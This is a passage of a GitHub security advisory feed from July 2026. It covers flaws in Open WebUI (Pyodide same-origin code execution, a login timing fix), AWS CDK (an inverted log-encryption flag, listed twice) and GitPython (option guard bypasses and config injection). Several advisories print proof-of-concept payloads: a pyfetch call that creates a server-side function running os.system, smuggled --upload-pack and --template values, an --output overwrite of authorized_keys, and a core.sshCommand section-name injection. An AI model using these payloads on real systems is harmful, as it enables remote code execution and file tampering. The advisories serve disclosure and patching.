<p>The authentication path now runs a bcrypt verification against a constant placeholder hash whenever the email does not resolve to an active credential, so a real hash comparison executes on every attempt and the response time is the same whether or not the account exists. Fixed in 0.10.0.</p>
<h3 id="credits">Credits</h3>
<p>@dievus</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-7rw5-9f7q-xj36">https://github.com/open-webui/open-webui/security/advisories/GHSA-7rw5-9f7q-xj36</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59218">https://nvd.nist.gov/vuln/detail/CVE-2026-59218</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26385">https://github.com/open-webui/open-webui/pull/26385</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/993e74912199c66c522f08ec81abe31d76985e39">https://github.com/open-webui/open-webui/commit/993e74912199c66c522f08ec81abe31d76985e39</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-7rw5-9f7q-xj36">https://github.com/advisories/GHSA-7rw5-9f7q-xj36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7rw5-9f7q-xj36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T16:55:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Stored web worker XSS via Pyodide]]></title>
        <id>https://github.com/advisories/GHSA-4r2p-27mh-5m22</id>
        <link href="https://github.com/advisories/GHSA-4r2p-27mh-5m22"/>
        <updated>2026-07-24T16:54:42.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Title:</strong> Same-origin Pyodide code execution allows server-side RCE via a shared chat</p>
<h3 id="summary">Summary</h3>
<p>Open WebUI runs client-side Python (Pyodide) in a same-origin web worker. Through Pyodide's JavaScript API (<code>pyodide.http.pyfetch</code>, or the <code>js</code> module which exposes the page's <code>fetch</code> / <code>XMLHttpRequest</code>) executed Python can issue requests on the application origin, and those requests carry the victim's session cookie. A low-privileged user can store such a payload in a chat message, share the chat, and when a victim opens it and clicks <strong>Run</strong> the payload executes authenticated same-origin requests as the victim. When the victim is an admin (or a user holding <code>workspace.functions</code> / <code>workspace.tools</code> permissions) the payload creates a Function/Tool whose body runs server-side, yielding <strong>remote code execution</strong>.</p>
<h3 id="details">Details</h3>
<p>Pyodide's <code>js</code> bridge gives Python in the worker the same reach as inline JavaScript on the origin, and the worker is same-origin, so a credentialed request to the app's own API is authenticated as the victim. No separate XSS sink is required: storing the payload in a shared chat and having the victim run it is enough.</p>
<pre><code class="language-python">from pyodide.http import pyfetch
import json
await pyfetch('/api/v1/functions/create', method='POST', credentials='include',
              headers={'Content-Type': 'application/json'},
              body=json.dumps({'id': 'x', 'name': 'x', 'meta': {'description': 'x'},
                               'content': "import os; os.system('&lt;attacker command&gt;')"}))
</code></pre>
<h3 id="impact">Impact</h3>
<p>When the victim runs the shared code, an authenticated low-privileged user achieves remote code execution on the server (the created Function/Tool runs server-side Python) if the victim is an admin or holds <code>workspace.functions</code> / <code>workspace.tools</code> permissions. More generally the executed code can issue any authenticated request as the victim. Requires the victim to click Run, and Open WebUI configured to use Pyodide.</p>
<h3 id="patched">Patched</h3>
<p>Pyodide now runs in a sandboxed iframe at an opaque origin by default (<code>sandbox="allow-scripts"</code>, no <code>allow-same-origin</code>). At an opaque origin <code>pyfetch</code>, <code>fetch</code> and <code>XMLHttpRequest</code> to the app become cross-origin requests that carry no session cookie and are CORS-blocked, and the <code>js</code> bridge operates on the isolated iframe window with no access to the parent's cookie, token, <code>localStorage</code> or DOM. Full Python, JavaScript and external fetch keep working. IDBFS persistence is available only behind <code>ENABLE_PYODIDE_FILE_PERSISTENCE=true</code>, which restores the same-origin worker and re-accepts this risk.</p>
<h3 id="workaround">Workaround</h3>
<p>Until upgraded, disable Pyodide code execution or set the Code Execution / Code Interpreter engine to a server-side option.</p>
<h3 id="credits">Credits</h3>
<p>@gg0h</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-4r2p-27mh-5m22">https://github.com/open-webui/open-webui/security/advisories/GHSA-4r2p-27mh-5m22</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59214">https://nvd.nist.gov/vuln/detail/CVE-2026-59214</a></li>
<li><a href="https://github.com/advisories/GHSA-4r2p-27mh-5m22">https://github.com/advisories/GHSA-4r2p-27mh-5m22</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r2p-27mh-5m22</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:54:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aws-cdk.aws-codebuild] AWS CDK CodeBuild S3 Log Encryption Boolean Inversion]]></title>
        <id>https://github.com/advisories/GHSA-464c-974j-9xm6</id>
        <link href="https://github.com/advisories/GHSA-464c-974j-9xm6"/>
        <updated>2026-07-24T16:44:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The AWS Cloud Development Kit (AWS CDK) is an open-source software development framework for defining cloud infrastructure in code and provisioning it through AWS CloudFormation. We identified an issue in which explicitly setting <code>encrypted: true</code> on the <code>S3LoggingOptions</code> property of an AWS CodeBuild project construct produces the opposite of the intended behavior, disabling encryption on CodeBuild build logs stored in S3.</p>
<h2 id="impact">Impact</h2>
<p>The <code>S3LoggingOptions.encrypted</code> property in the <code>aws-codebuild</code> module uses positive polarity (<code>true</code> = encryption ON), but is mapped directly to the CloudFormation <code>S3LogsConfig.EncryptionDisabled</code> field, which uses negative polarity (<code>true</code> = encryption OFF). Because the value is not negated before being passed to CloudFormation, any explicit assignment produces inverted behavior:</p>
<ul>
<li><p>Setting <code>encrypted: true</code> (intending encryption ON) causes CloudFormation to receive <code>EncryptionDisabled: true</code>, disabling encryption.</p>
</li>
<li><p>Setting <code>encrypted: false</code> (intending encryption OFF) causes CloudFormation to receive <code>EncryptionDisabled: false</code>, enabling encryption.</p>
</li>
</ul>
<p>Users who omit the property entirely are not affected, as <code>undefined</code> passes through to CloudFormation, which defaults to encryption enabled.</p>
<p>Users affected by this issue could have CodeBuild S3 build logs stored using SSE-S3 (Amazon S3-managed keys, AES-256) rather than the AWS managed keys that CodeBuild applies by default. Since January 5, 2023, Amazon S3 automatically encrypts all new object uploads with SSE-S3, so logs written after that date remain encrypted at rest. However, logs written prior to that date to buckets that did not have default encryption configured at the time are potentially not encrypted at rest.</p>
<p>Impacted versions: &gt;= 1.75.0 and &lt;= 2.252.0</p>
<h2 id="patches">Patches</h2>
<p>This issue has been addressed in <code>aws-cdk-lib</code> version 2.253.0. Upgrade to the latest version and ensure any forked or derivative code is patched to incorporate the new fixes.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Users who are unable to immediately upgrade to version 2.253.0 should omit the <code>encrypted</code> property from their <code>S3LoggingOptions</code> configuration entirely. When the property is omitted, the value is not passed to CloudFormation, and CodeBuild applies its default behavior of encrypting build logs using AWS managed keys.</p>
<h2 id="references">References</h2>
<p>If you have any questions or comments about this advisory, contact AWS Security via our issue reporting page [1] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://aws.amazon.com/security/vulnerability-reporting/">https://aws.amazon.com/security/vulnerability-reporting/</a></p>
<h2 id="acknowledgement">Acknowledgement</h2>
<p>AWS thanks AISafe for collaborating on this issue through the coordinated disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/aws-cdk/security/advisories/GHSA-464c-974j-9xm6">https://github.com/aws/aws-cdk/security/advisories/GHSA-464c-974j-9xm6</a></li>
<li><a href="https://github.com/aws/aws-cdk/pull/37761">https://github.com/aws/aws-cdk/pull/37761</a></li>
<li><a href="https://github.com/aws/aws-cdk/commit/40319185dc645d2afc6acf1d25547a86250e97af">https://github.com/aws/aws-cdk/commit/40319185dc645d2afc6acf1d25547a86250e97af</a></li>
<li><a href="https://github.com/aws/aws-cdk/releases/tag/v2.253.0">https://github.com/aws/aws-cdk/releases/tag/v2.253.0</a></li>
<li><a href="https://github.com/advisories/GHSA-464c-974j-9xm6">https://github.com/advisories/GHSA-464c-974j-9xm6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-464c-974j-9xm6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-24T16:44:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aws-cdk-lib] AWS CDK CodeBuild S3 Log Encryption Boolean Inversion]]></title>
        <id>https://github.com/advisories/GHSA-464c-974j-9xm6</id>
        <link href="https://github.com/advisories/GHSA-464c-974j-9xm6"/>
        <updated>2026-07-24T16:44:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The AWS Cloud Development Kit (AWS CDK) is an open-source software development framework for defining cloud infrastructure in code and provisioning it through AWS CloudFormation. We identified an issue in which explicitly setting <code>encrypted: true</code> on the <code>S3LoggingOptions</code> property of an AWS CodeBuild project construct produces the opposite of the intended behavior, disabling encryption on CodeBuild build logs stored in S3.</p>
<h2 id="impact">Impact</h2>
<p>The <code>S3LoggingOptions.encrypted</code> property in the <code>aws-codebuild</code> module uses positive polarity (<code>true</code> = encryption ON), but is mapped directly to the CloudFormation <code>S3LogsConfig.EncryptionDisabled</code> field, which uses negative polarity (<code>true</code> = encryption OFF). Because the value is not negated before being passed to CloudFormation, any explicit assignment produces inverted behavior:</p>
<ul>
<li><p>Setting <code>encrypted: true</code> (intending encryption ON) causes CloudFormation to receive <code>EncryptionDisabled: true</code>, disabling encryption.</p>
</li>
<li><p>Setting <code>encrypted: false</code> (intending encryption OFF) causes CloudFormation to receive <code>EncryptionDisabled: false</code>, enabling encryption.</p>
</li>
</ul>
<p>Users who omit the property entirely are not affected, as <code>undefined</code> passes through to CloudFormation, which defaults to encryption enabled.</p>
<p>Users affected by this issue could have CodeBuild S3 build logs stored using SSE-S3 (Amazon S3-managed keys, AES-256) rather than the AWS managed keys that CodeBuild applies by default. Since January 5, 2023, Amazon S3 automatically encrypts all new object uploads with SSE-S3, so logs written after that date remain encrypted at rest. However, logs written prior to that date to buckets that did not have default encryption configured at the time are potentially not encrypted at rest.</p>
<p>Impacted versions: &gt;= 1.75.0 and &lt;= 2.252.0</p>
<h2 id="patches">Patches</h2>
<p>This issue has been addressed in <code>aws-cdk-lib</code> version 2.253.0. Upgrade to the latest version and ensure any forked or derivative code is patched to incorporate the new fixes.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Users who are unable to immediately upgrade to version 2.253.0 should omit the <code>encrypted</code> property from their <code>S3LoggingOptions</code> configuration entirely. When the property is omitted, the value is not passed to CloudFormation, and CodeBuild applies its default behavior of encrypting build logs using AWS managed keys.</p>
<h2 id="references">References</h2>
<p>If you have any questions or comments about this advisory, contact AWS Security via our issue reporting page [1] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://aws.amazon.com/security/vulnerability-reporting/">https://aws.amazon.com/security/vulnerability-reporting/</a></p>
<h2 id="acknowledgement">Acknowledgement</h2>
<p>AWS thanks AISafe for collaborating on this issue through the coordinated disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/aws-cdk/security/advisories/GHSA-464c-974j-9xm6">https://github.com/aws/aws-cdk/security/advisories/GHSA-464c-974j-9xm6</a></li>
<li><a href="https://github.com/aws/aws-cdk/pull/37761">https://github.com/aws/aws-cdk/pull/37761</a></li>
<li><a href="https://github.com/aws/aws-cdk/commit/40319185dc645d2afc6acf1d25547a86250e97af">https://github.com/aws/aws-cdk/commit/40319185dc645d2afc6acf1d25547a86250e97af</a></li>
<li><a href="https://github.com/aws/aws-cdk/releases/tag/v2.253.0">https://github.com/aws/aws-cdk/releases/tag/v2.253.0</a></li>
<li><a href="https://github.com/advisories/GHSA-464c-974j-9xm6">https://github.com/advisories/GHSA-464c-974j-9xm6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-464c-974j-9xm6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-24T16:44:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GitPython] GitPython: Unsafe git option guard bypass via single-character kwarg value token smuggling enables arbitrary command execution]]></title>
        <id>https://github.com/advisories/GHSA-r9mr-m37c-5fr3</id>
        <link href="https://github.com/advisories/GHSA-r9mr-m37c-5fr3"/>
        <updated>2026-07-24T16:42:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>GitPython's <code>check_unsafe_options</code> guard (the control introduced by CVE-2026-42215 / GHSA-2f96 and hardened since) can be bypassed for <strong>every</strong> guarded method (<code>clone</code>/<code>clone_from</code>, <code>fetch</code>/<code>pull</code>/<code>push</code>, <code>ls_remote</code>, <code>iter_commits</code>, <code>blame</code>, <code>archive</code>) by smuggling an option token inside the VALUE of a single-character kwarg. In the default <code>allow_unsafe_options=False</code> configuration this yields arbitrary command execution via <code>--upload-pack</code>.</p>
<h2 id="root-cause">Root Cause</h2>
<p>The guard builds its candidate option list from kwarg KEYS only: <code>_option_candidates([], {"n":"--upload-pack=&lt;cmd&gt;"})</code> returns <code>['-n']</code> (cmd.py:1042-1046 derives the candidate from the key, never the value). <code>-n</code> is not on the denylist, so <code>check_unsafe_options</code> passes. But <code>transform_kwarg('n', value, split_single_char_options=True)</code> (cmd.py:1600-1606) emits <strong>two</strong> argv tokens <code>['-n', '--upload-pack=&lt;cmd&gt;']</code>. git then parses the second token as <code>--upload-pack</code> and executes the attacker-supplied command. The guard never inspects the value that becomes a separate argv token.</p>
<h2 id="impact">Impact</h2>
<p>Arbitrary OS command execution as the host process (via <code>--upload-pack</code>) in the default configuration, affecting all guarded methods since they all build candidates through the name-only <code>_option_candidates</code>.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-python">from git import Repo
Repo.clone_from(bare_repo, out_dir, n="--upload-pack=touch /tmp/ACE;git-upload-pack")
# /tmp/ACE created -&gt; ACE. Direct-name form upload_pack="..." is correctly BLOCKED.
</code></pre>
<p>File-write variant on a guarded revision command: <code>iter_commits('HEAD', g='--output=/path')</code> -&gt; candidate <code>['-g']</code> passes, argv <code>['-g','--output=/path']</code>, victim file truncated.</p>
<h2 id="attack-chain">Attack Chain</h2>
<ol>
<li>Entry: app forwards a user-supplied options dict -&gt; <code>Repo.clone_from(url, path, n="--upload-pack=touch /tmp/ACE;git-upload-pack")</code>. Guard: <code>check_unsafe_options(options=_option_candidates([], kwargs), unsafe=unsafe_git_clone_options)</code> at base.py. Bypass proof: <code>_option_candidates([], {"n":"--upload-pack=..."})</code> -&gt; <code>['-n']</code> (key-only), not on denylist -&gt; no UnsafeOptionError (verified live).</li>
<li>Transform: <code>transform_kwarg('n', value, split_single_char_options=True)</code> -&gt; <code>['-n', '--upload-pack=touch /tmp/ACE;git-upload-pack']</code>. Guard: none (guard already passed on name-only candidate). Bypass proof: verified transform emits two tokens.</li>
<li>Sink: <code>git clone -n --upload-pack='touch ...;git-upload-pack' -- &lt;src&gt; &lt;dst&gt;</code>; git parses and runs the second token. Impact: ACE (marker created, verified end-to-end).</li>
</ol>
<h2 id="bypass-evidence">Bypass Evidence</h2>
<p>Live-verified on HEAD (tag 3.1.53): <code>_option_candidates</code> returns key-only candidate <code>['-n']</code>; <code>transform_kwargs</code> emits the smuggled <code>--upload-pack=</code> token; clone_from with the payload created the marker file; the direct-name <code>upload_pack=</code> form raised UnsafeOptionError. All prior bypasses (GHSA-rpm5 underscore key, GHSA-2f96 long-option abbreviation, GHSA-v396 joined short option, GHSA-x2qx multi-before-split) are BLOCKED on HEAD — this is a distinct kwarg-value-&gt;separate-token vector.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><code>&lt;= 3.1.53</code></p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Make <code>_option_candidates</code> also emit candidates derived from single-character kwarg VALUES when <code>split_single_char_options</code> is in effect, OR run <code>check_unsafe_options</code> over the fully-transformed argv rather than the reconstructed name-only candidate list.</p>
<hr>
<p>Reported by <strong>zx (Jace)</strong> — GitHub: @manus-use</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-r9mr-m37c-5fr3">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-r9mr-m37c-5fr3</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/pull/2180">https://github.com/gitpython-developers/GitPython/pull/2180</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/commit/e8d0fbf774d1f6baa3b481adfe48bd262e43b453">https://github.com/gitpython-developers/GitPython/commit/e8d0fbf774d1f6baa3b481adfe48bd262e43b453</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54</a></li>
<li><a href="https://github.com/advisories/GHSA-r9mr-m37c-5fr3">https://github.com/advisories/GHSA-r9mr-m37c-5fr3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r9mr-m37c-5fr3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:42:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GitPython] GitPython: Incomplete unsafe_git_clone_options denylist omits --template enabling arbitrary command execution via clone hooks]]></title>
        <id>https://github.com/advisories/GHSA-6p8h-3wgx-97gf</id>
        <link href="https://github.com/advisories/GHSA-6p8h-3wgx-97gf"/>
        <updated>2026-07-24T16:42:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>GitPython's <code>unsafe_git_clone_options</code> denylist omits <code>--template</code>. <code>git clone --template=&lt;dir&gt;</code> copies <code>&lt;dir&gt;/hooks/</code> into the new repository and runs them (<code>post-checkout</code> fires during clone), so a caller who can influence clone options can achieve arbitrary command execution in the default <code>allow_unsafe_options=False</code> configuration.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>base.py:145-152</code> defines <code>unsafe_git_clone_options = ["--upload-pack","-u","--config","-c"]</code> — <code>--template</code> is absent. The guard candidate <code>['--template']</code> passes <code>check_unsafe_options</code> (verified). git copies the hook directory and executes <code>post-checkout</code> at checkout time. git's <code>protocol.allow</code>/<code>GIT_ALLOW_PROTOCOL</code> do not gate <code>--template</code>; the incomplete denylist is the only defense.</p>
<h2 id="impact">Impact</h2>
<p>Arbitrary OS command execution during clone (default config). Requires an attacker-readable directory containing an executable hook — a genuine second precondition (realistic via shared filesystems, upload dirs, <code>/tmp</code>, or attacker-writable network paths), reflected as AC:H.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-python"># attacker stages &lt;dir&gt;/hooks/post-checkout (chmod +x)
from git import Repo
Repo.clone_from(src, dst, template='&lt;dir&gt;')   # post-checkout hook executes -&gt; marker created (verified)
</code></pre>
<h2 id="attack-chain">Attack Chain</h2>
<ol>
<li>Setup: attacker stages <code>&lt;dir&gt;/hooks/post-checkout</code> (chmod +x). Guard: n/a (filesystem).</li>
<li>Entry: <code>Repo.clone_from(url, path, template='&lt;dir&gt;')</code>. Guard: <code>check_unsafe_options(candidates=['--template'], unsafe=unsafe_git_clone_options)</code>. Bypass proof: <code>--template</code> not on the denylist -&gt; passes (verified candidate <code>['--template']</code>, no error).</li>
<li>Sink: git copies the hook and executes <code>post-checkout</code> at checkout. Impact: ACE, default config (verified marker created).</li>
</ol>
<h2 id="bypass-evidence">Bypass Evidence</h2>
<p>Live-verified on HEAD (tag 3.1.53): guard candidate <code>['--template']</code> passed with no error; staged <code>post-checkout</code> hook executed during <code>clone_from</code>, creating the marker. Independent of the value-smuggle bypass (<code>--template</code> is a legitimate long option that survives any single-char-value fix). Not covered by any existing advisory.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><code>&lt;= 3.1.53</code></p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Add <code>--template</code> (and audit for other hook/exec-influencing options) to <code>unsafe_git_clone_options</code>.</p>
<hr>
<p>Reported by <strong>zx (Jace)</strong> — GitHub: @manus-use</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-6p8h-3wgx-97gf">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-6p8h-3wgx-97gf</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/pull/2180">https://github.com/gitpython-developers/GitPython/pull/2180</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/commit/ffcb5359e87619f4fe4a70a4aff5f08c5580ba97">https://github.com/gitpython-developers/GitPython/commit/ffcb5359e87619f4fe4a70a4aff5f08c5580ba97</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54</a></li>
<li><a href="https://github.com/advisories/GHSA-6p8h-3wgx-97gf">https://github.com/advisories/GHSA-6p8h-3wgx-97gf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6p8h-3wgx-97gf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:42:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GitPython] GitPython: Arbitrary file overwrite via git diff --output argument injection in Diffable.diff (key- and value-controlled)]]></title>
        <id>https://github.com/advisories/GHSA-fjr4-x663-mwxc</id>
        <link href="https://github.com/advisories/GHSA-fjr4-x663-mwxc"/>
        <updated>2026-07-24T16:41:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>Diffable.diff()</code> forwards <code>**kwargs</code> straight into <code>diff</code>/<code>diff_tree</code> with <strong>no</strong> <code>check_unsafe_options</code> guard. <code>Diffable</code> is mixed into <code>Commit</code>, <code>Tree</code>, <code>IndexFile</code>, and <code>Submodule</code>, giving a broad surface. <code>git diff --output=&lt;path&gt;</code> writes real patch content to an attacker-chosen path, enabling arbitrary file overwrite.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>diff.py:188-283</code> builds and runs the diff command with no <code>check_unsafe_options</code> anywhere in the method (grep-confirmed). Additionally <code>diff.py:265</code> does <code>args.insert(0, other)</code>, placing the caller-supplied <code>other</code> ref BEFORE the <code>--</code> separator, so a value of <code>--output=/path</code> is parsed by git as an option — a value-only control path requiring no kwarg key.</p>
<h2 id="impact">Impact</h2>
<p>Overwrite/corrupt any file at process privilege with attacker-chosen path (e.g. <code>~/.ssh/authorized_keys</code>, configs, lockfiles). Content is real diff/patch bytes (attacker-influenced). Per the skill's rule, controlling WHICH file is overwritten = I:H regardless of content constraints.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-python"># Key-control:
commit.diff(other_commit, output='/home/app/.ssh/authorized_keys')   # victim overwritten with diff (105 bytes verified)
# Value-control (attacker controls only the ref string):
commit.diff(other='--output=/home/app/.ssh/authorized_keys')          # 14-byte victim -&gt; 146 bytes of diff-tree output
</code></pre>
<h2 id="attack-chain">Attack Chain</h2>
<ol>
<li>Entry (value-control): <code>commit.diff(other=&lt;user ref&gt;)</code> with <code>other = "--output=/home/app/.ssh/authorized_keys"</code>. Guard: none in <code>Diffable.diff</code>. Bypass proof: no <code>check_unsafe_options</code> in the method body (grep); <code>other</code> inserted pre-<code>--</code> at diff.py:265.</li>
<li>Sink: <code>git diff-tree &lt;sha&gt; --output=/home/app/.ssh/authorized_keys -r ...</code> -&gt; git opens+truncates the target then writes diff content. Impact: overwrite/corrupt any file at process privilege (attacker chooses the path). Verified argv and victim overwrite live.</li>
</ol>
<h2 id="bypass-evidence">Bypass Evidence</h2>
<p>Live-verified on HEAD (tag 3.1.53): both key-control (<code>output=</code>) and value-control (<code>other='--output=...'</code>) overwrote a victim file with real diff-tree content; argv confirmed <code>['git','diff-tree','&lt;sha&gt;','--output=/victim','-r',...]</code>. This is the same value-control model GHSA-956x deemed fix-worthy for <code>iter_commits(rev='--output=')</code> — but <code>diff</code> is a distinct, unguarded sink NOT touched by that fix.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><code>&lt;= 3.1.53</code></p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Add <code>check_unsafe_options</code> to <code>Diffable.diff</code> (mirroring <code>iter_commits</code>/<code>archive</code>), and/or place <code>--end-of-options</code> before the <code>other</code> ref so it cannot be parsed as an option.</p>
<hr>
<p>Reported by <strong>zx (Jace)</strong> — GitHub: @manus-use</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-fjr4-x663-mwxc">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-fjr4-x663-mwxc</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/pull/2180">https://github.com/gitpython-developers/GitPython/pull/2180</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/commit/1d51b891d7f236044a6aa17498ec682b63dad6e6">https://github.com/gitpython-developers/GitPython/commit/1d51b891d7f236044a6aa17498ec682b63dad6e6</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54</a></li>
<li><a href="https://github.com/advisories/GHSA-fjr4-x663-mwxc">https://github.com/advisories/GHSA-fjr4-x663-mwxc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fjr4-x663-mwxc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:41:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gitpython] GitPython: git-config section-name injection enables arbitrary config directives (core.sshCommand RCE)]]></title>
        <id>https://github.com/advisories/GHSA-3rp5-jjmw-4wv2</id>
        <link href="https://github.com/advisories/GHSA-3rp5-jjmw-4wv2"/>
        <updated>2026-07-24T16:22:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In GitPython <code>&lt;= 3.1.52</code>, the config writer neutralizes only CR, LF, and NUL in configuration <strong>names</strong>, but writes section names into the <code>[...]</code> header with no other escaping. A section/subsection name that contains <code>] [ "</code> closes the intended header and opens a second same-line section, injecting an arbitrary config directive — with no newline required. Because a submodule <strong>name</strong> is attacker-controlled data (it comes from a repository's <code>.gitmodules</code>, or from an application that lets a user name a submodule) and is written verbatim into the parent repository's trusted <code>.git/config</code>, an attacker can set <code>core.sshCommand</code> (or <code>alias.*</code>, <code>core.pager</code>, <code>core.fsmonitor</code>) and achieve remote code execution on the victim's next git operation. Likely <strong>CWE-74 (Injection)</strong>.</p>
<p>This is a distinct variant of the injection addressed by GHSA-mv93-w799-cj2w / GHSA-v87r-6q3f-2j67: those fixed <strong>newline</strong> injection into config values/names (patched in 3.1.50); the <code>[r\n\x00]</code> guard added for them does not stop a <strong>same-line</strong> section break inside a name.</p>
<h3 id="details">Details</h3>
<p>The only guard applied to section/option names before writing is <code>_assure_config_name_safe</code>, which uses a regex that matches solely CR/LF/NUL:</p>
<p><code>git/config.py:75,897-899</code> (<code>GitPython 3.1.52</code>):</p>
<pre><code class="language-python">UNSAFE_CONFIG_CHARS_RE = re.compile(r"[\r\n\x00]")
...
def _assure_config_name_safe(self, name: "cp._SectionName", label: str) -&gt; None:
    if isinstance(name, str) and UNSAFE_CONFIG_CHARS_RE.search(name):
        raise ValueError("Git config %s names must not contain CR, LF, or NUL" % label)
</code></pre>
<p>The name is then serialized into the header with no escaping of <code>]</code>, <code>[</code>, <code>"</code>, space, <code>=</code> or <code>#</code>:</p>
<p><code>git/config.py:693</code>:</p>
<pre><code class="language-python">fp.write(("[%s]\n" % name).encode(defenc))
</code></pre>
<p>For submodules the name is wrapped as <code>submodule "&lt;name&gt;"</code> (<code>git/objects/submodule/util.py:39</code>, <code>return f'submodule "{name}"'</code>), which supplies the balancing quote. A submodule named:</p>
<pre><code>x"] [core] sshCommand=CMD #
</code></pre>
<p>therefore serializes to the header <code>[submodule "x"] [core] sshCommand=CMD #"]</code>. git parses everything after the first <code>]</code> on that line as a fresh section, yielding <code>core.sshCommand=CMD</code> (the trailing <code>#"]</code> is an inline comment). No CR/LF/NUL appears, so <code>_assure_config_name_safe</code> never fires.</p>
<p>The attacker-controlled name reaches this sink through documented public entry points that write it into the parent repository's <code>.git/config</code>:</p>
<ul>
<li><code>Repo.create_submodule(name=&lt;untrusted&gt;, ...)</code> → <code>Submodule.add</code> → <code>git/objects/submodule/base.py:619</code> <code>writer.set_value(sm_section(name), "url", url)</code> — a single call, no hostile remote required.</li>
<li><code>Repo.clone_from(&lt;hostile url&gt;)</code> + <code>repo.submodule_update(init=True)</code> → <code>git/objects/submodule/base.py:855</code> <code>writer.set_value(sm_section(self.name), "url", self.url)</code>, where <code>self.name</code> is read unvalidated from the cloned repo's <code>.gitmodules</code>.</li>
</ul>
